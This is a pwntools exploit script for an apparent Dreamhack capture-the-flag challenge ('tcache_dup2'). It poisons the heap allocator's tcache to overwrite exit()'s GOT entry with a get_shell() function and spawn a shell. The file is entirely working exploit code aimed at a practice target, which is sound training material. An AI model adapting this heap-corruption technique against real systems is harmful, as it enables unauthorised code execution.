from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/tcache_dup2')
else:
    r = remote('host1.dreamhack.games', 10905)

sla = r.sendlineafter
sa = r.sendafter


def Create(size, data):
    sla('> ', '1')
    sla('Size: ', str(size))
    sla('Data: ', data)


def Modify(idx, size, data):
    sla('> ', '2')
    sla('idx: ', str(idx))
    sla('Size: ', str(size))
    sla('Data: ', data)


def Delete(idx):
    sla('> ', '3')
    sla('idx: ', str(idx))


exit_got = 0x404060  # GOT of exit()
get_shell = 0x401530  # get_shell()


Create(0x18, 'a')  # idx: 0
Create(0x18, 'a')  # idx: 1
Delete(0)
Delete(1)

Modify(1, 8, p64(exit_got))
Create(0x18, 'a')  # idx: 2
Create(0x18, p64(get_shell))  # overwrite GOT of exit() with get_shell()

sla('> ', '3')
sla('idx: ', '7')  # call exit()


r.interactive()